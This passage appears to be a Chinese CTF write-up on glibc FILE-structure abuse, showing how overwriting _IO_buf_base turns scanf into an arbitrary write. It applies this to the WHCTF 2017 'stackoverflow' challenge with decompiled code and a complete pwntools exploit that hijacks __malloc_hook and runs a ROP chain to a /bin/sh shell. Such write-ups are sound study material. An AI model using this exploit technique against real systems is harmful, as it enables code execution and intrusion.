_IO_buf_base, _IO_buf_end, _IO_read_ptr, _IO_read_end
4个变量都是在_IO_FILE的结构体里的，buf_base到buf_end是一个buf，而read_ptr到read_end则比较神奇了，我猜测可能是还没有处理的部分，read_ptr在一开始和buf_base相等，输入之后read_end会指向输入之后的结尾部分，buf_end是不变的，每次输入只能输入buf_end-buf_base个size，而且只有在read_ptr >= read_end，也就是为空的时候才能够读入buf_base。
根据实际测验发现，每一次scanf似乎read_ptr都会加一，其实用到这个结论就可以了。
当然，最主要的地方还是调用read系统调用，写入的位置就在buf_base!于是如果可以更改这个值，就可以利用scanf进行任意写了！
这个手法虽然相对虚表来说限制颇多，但是至少是提供了一个任意写的方案，可以作为扩大控制能力的一种手法，算是一种新的思路。
**2. WHCTF 2017 stackoverflow**
接下来我们来看一下这种新思路的应用吧。题目来源于WHCTF 2017。
    void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
    {
      __int64 v3; // ST08_8@1
      v3 = *MK_FP(__FS__, 40LL);
      setvbuf(stdin, 0LL, 2, 0LL);
      setvbuf(stdout, 0LL, 2, 0LL);
      input_name();
      print_hint();
      while ( 1 )
        main_proc();
    }
    __int64 input_name()
    {
      char name; // [sp+0h] [bp-70h]@1
      __int64 v2; // [sp+68h] [bp-8h]@1
      v2 = *MK_FP(__FS__, 40LL);
      printf("leave your name, bro:");
      read_content(&name, 0x50);
      printf("worrier %s, now begin your challenge", &name);
      return *MK_FP(__FS__, 40LL) ^ v2;
    }
    __int64 __fastcall read_content(char *buf, int size)
    {
      __int64 result; // rax@4
      __int64 v3; // rcx@4
      unsigned int v4; // [sp+14h] [bp-Ch]@1
      __int64 v5; // [sp+18h] [bp-8h]@1
      v5 = *MK_FP(__FS__, 40LL);
      v4 = read(0, buf, size);
      if ( (v4 & 0x80000000) != 0 )
      {
        printf("Error!", buf);
        exit(0);
      }
      result = v4;
      v3 = *MK_FP(__FS__, 40LL) ^ v5;
      return result;
    }
    __int64 print_hint()
    {
      __int64 v0; // ST08_8@1
      v0 = *MK_FP(__FS__, 40LL);
      puts("Welcome to stackoverflow challenge!!!");
      puts("it is really easy");
      return *MK_FP(__FS__, 40LL) ^ v0;
    }
    __int64 main_proc()
    {
      __int64 result; // rax@7
      __int64 v1; // rcx@7
      int size; // [sp+8h] [bp-18h]@1
      int tmp_size; // [sp+Ch] [bp-14h]@1
      void *v4; // [sp+10h] [bp-10h]@4
      __int64 v5; // [sp+18h] [bp-8h]@1
      v5 = *MK_FP(__FS__, 40LL);
      printf("please input the size to trigger stackoverflow: ");
      _isoc99_scanf("%d", &size);
      IO_getc(stdin);                               // get rid of n
      tmp_size = size;
      while ( size > 0x300000 )
      {
        puts("too much bytes to do stackoverflow.");
        printf("please input the size to trigger stackoverflow: ");
        _isoc99_scanf("%d", &size);
        IO_getc(stdin);
      }
      v4 = malloc(0x28uLL);
      global_malloced = (char *)malloc(size + 1);
      if ( !global_malloced )
      {
        printf("Error!");
        exit(0);
      }
      printf("padding and ropchain: ");
      read_content(global_malloced, size);
      global_malloced[tmp_size] = 0; // out of bound write
      result = 0LL;
      v1 = *MK_FP(__FS__, 40LL) ^ v5;
      return result;
    }
题目有意思的地方就在于他的手法了。只能写入一个NULL的情况是非常受限制的，还是看看分析吧。
**1) 漏洞位置**
①首先是input_name存在一个没有null结尾的输入，于是可以造成泄露，效果是可以泄露出libc，这个是比较简单的地方。
②main_proc中存在一个越界写，当输入size大于0x300000的时候，tmp_size会保存，之后重新输入之后tmp_size没有更新，导致越界写。
**2) 利用思路**
问题1：越界写，且只能写入一个null，看似毫无用处，不过好在可以写入很多个null，于是malloc也可以进行多次，所以第一个任务是要能够写东西到有意义的地方，栈，堆或者libc，通过分配大地址导致堆mmap，我们可以使得分配的内容在libc之前附近的位置，于是通过越界写就可以写入libc了。
问题2：写啥？这个真的是卡了很多人的一个地方，最终的选择，是写了_IO_buf_base，这个题目比较特殊，给出的libc-2.24.so偏移有特殊性，_IO_buf_base比_IO_buf_end小1，而且_IO_buf_end地址的最低位刚好是00，于是向base写入一个00，就可以指向end，之后往end写入malloc_hook的地址，然后循环一下使read_ptr和read_end相等，再次读入，就可以写入malloc_hook了
问题3：如何扩大控制。其实控制了执行流，就比较简单了，我们找了一个read：
    .text:0000000000400A23 ; 7:   read_content(&name, 0x50);
    .text:0000000000400A23 lea     rax, [rbp+name]
    .text:0000000000400A27 mov     esi, 50h
    .text:0000000000400A2C mov     rdi, rax
    .text:0000000000400A2F call    read_content
这个read是input_name里的，往栈上写入内容，之后就可以进行rop了。
**3) exp**
    import sys
    from pwn import *
    context(os='linux', arch='amd64', log_level='debug')
    DEBUG = 0
    GDB = 1
    libc = ELF('./libc-2.24.so')
    if DEBUG:
        p = process('./stackoverflow')
    else:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
        p = remote(HOST, PORT)
    def leak_libc():
        p.sendline('a' * 7)
        p.recvuntil('worrier ' + 'a' * 7 + 'n')
        leak = ((p.recvuntil(',')[:-1]).ljust(8, 'x00'))
        p.info(len(leak))
        addr = u64(leak)
        return addr - 0x7dd52
    def main():
        if GDB:
            raw_input()
        libc_base = leak_libc()
        p.info('libc_base: {}'.format(hex(libc_base)))
        p.recvuntil('stackoverflow:')
        p.sendline(str(0x5c28f8 - 0x10))
        p.recvuntil('stackoverflow:')
        p.sendline(str(0x200000))
        p.recvuntil('ropchain:')
        p.send('a') # doesn't matter
        p.recvuntil('stackoverflow:')
        # This will be written at &_IO_buf_base
        malloc_hook_end = libc_base + libc.symbols['__malloc_hook'] + 8
        payload = p64(malloc_hook_end)
        p.send(payload)
        p.recvuntil('ropchain:')
        p.send('b')
        for i in range(len(payload) - 1):
            p.recvuntil('stackoverflow:')
            p.recvuntil('ropchain:')
            p.send('x')
        file_struct_left = p64(malloc_hook_end)
        file_struct_left += p64(0)
        file_struct_left += p64(0)
        file_struct_left += p64(0)
        file_struct_left += p64(0)
        file_struct_left += p64(0)
        file_struct_left += p32(0)
        file_struct_left += p32(0x10)
        file_struct_left += p64(0xffffffffffffffff)
        file_struct_left += p64(0)
        file_struct_left += p64(libc_base + 0x3c3770)
        file_struct_left += p64(0xffffffffffffffff)
        file_struct_left += p64(0)
        file_struct_left += p64(libc_base + 0x3c19a0)
        file_struct_left += p64(0)
        file_struct_left += p64(0)
        file_struct_left += p64(0)
        file_struct_left += p64(0)
        file_struct_left += p64(0)
        file_struct_left += p64(0)
        file_struct_left += p64(libc_base + 0x3be400)
        payload = file_struct_left
        payload = payload.ljust(0x1f0, 'x00')
        payload += p64(0x400a23) # rip
        p.recvuntil('stackoverflow:')
        # This will be written in __malloc_hook
        p.send(payload)
        # Rop from here
        binsh_addr = 0x0000000000602000 + 0x500
        pop_rdi_ret = 0x000000000001fd7a  + libc_base
        pop_rsi_ret = 0x000000000001fcbd + libc_base
        pop_rdx_ret = 0x0000000000001b92 + libc_base
        payload = p64(pop_rdi_ret)
        payload += p64(0) # fd
        payload += p64(pop_rsi_ret)
        payload += p64(binsh_addr) # buf
        payload += p64(pop_rdx_ret)
        payload += p64(0x100) # nbytes
        payload += p64(libc_base + libc.symbols['read']) # read(0, binsh_addr, 0x100)
        payload += p64(pop_rdi_ret)
        payload += p64(binsh_addr) # system_cmd = /bin/shx00
        payload += p64(libc_base + libc.symbols['system']) # system("/bin/shx00")
        p.send(payload)
        p.send('/bin/shx00')
        p.interactive()
    if __name__ == "__main__":
        main()
这道题目其实就是一个写buf的手法的利用，只要能够想到用写buf的手法其实就很简单了。
**总结** **** ****
****
1.scanf和printf之类的输入输出函数最终都会调用相应虚函数完成底层操作，2.24之前可以通过更改虚表来控制执行流。
2.底层操作最终通过read等系统调用进行完成，也就是实现在虚表里，被初始化进虚表。
3.对于scanf来说，虚表实现写入的时候会使用到buf，这里的buf会在scanf时候用到，所以可以通过控制buf来达到对libc的一个任意写入，这个方法没有被2.24影响。
4.libc当中值得注意的地方还有很多，应该更多的去深入到源码去寻找这些有意思的东西。